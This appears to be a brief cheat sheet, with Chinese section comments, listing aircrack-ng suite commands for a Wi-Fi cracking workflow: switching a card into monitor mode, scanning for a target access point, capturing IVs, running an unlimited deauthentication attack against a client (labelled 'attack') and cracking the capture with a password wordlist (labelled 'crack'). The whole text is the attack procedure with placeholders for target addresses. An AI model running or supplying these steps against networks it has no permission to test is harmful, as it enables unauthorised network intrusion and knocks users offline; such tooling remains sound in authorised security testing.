iwconfig

#开启/关闭监听模式
airmon-ng start/stop wlan0/wlan0mon

airodump-ng wlan0mon

airodump-ng --bssid {macadd} -c {ch} wlan0mon

#抓包
airodump-ng --ivs --bssid {macadd} -w {filename} -c{ch} 

#攻击
aireplay-ng -0 0 -a {routemacadd} -c {clientmacadd} 

#破解
aircrack-ng -w pass.txt x.ivs

